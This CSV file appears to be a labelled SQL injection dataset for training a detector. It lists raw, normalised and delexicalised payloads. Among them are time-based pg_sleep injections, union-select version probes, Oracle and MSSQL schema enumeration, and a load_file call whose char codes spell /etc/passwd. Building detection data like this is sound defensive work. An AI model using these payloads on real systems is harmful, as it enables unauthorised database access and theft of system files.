payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
""" or pg_sleep  (  __TIME__  )  --",""" or pg_sleep ( __TIME__ ) --",""" or pg_sleep ( __TIME__ ) --",1,False,,sqli_dataset
create user name identified by pass123 temporary tablespace temp default tablespace users;,create user name identified by pass123 temporary tablespace temp default tablespace users;,create user <COL> identified by pass123 temporary tablespace temp default tablespace <TABLE>;,1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
"select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'","select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or @ @<NUM> = <NUM> union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1","select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"" ( union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --,select <COL> from syscolumns where <COL> = ( select <COL> from sysobjects where <COL> = tablename' ) --,1,False,,sqli_dataset
select * from users where id  =  1 +$+ or 1  =  1 -- 1,select * from users where id = 1 +$+ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$+ or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;","1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;","<NUM>; ( load_file ( char ( <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM> ) ) ) ,<NUM>,<NUM>,<NUM>;",1,False,,sqli_dataset
"select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'","select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or ||/<NUM> = <NUM> union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'","select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or \.<\ union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset
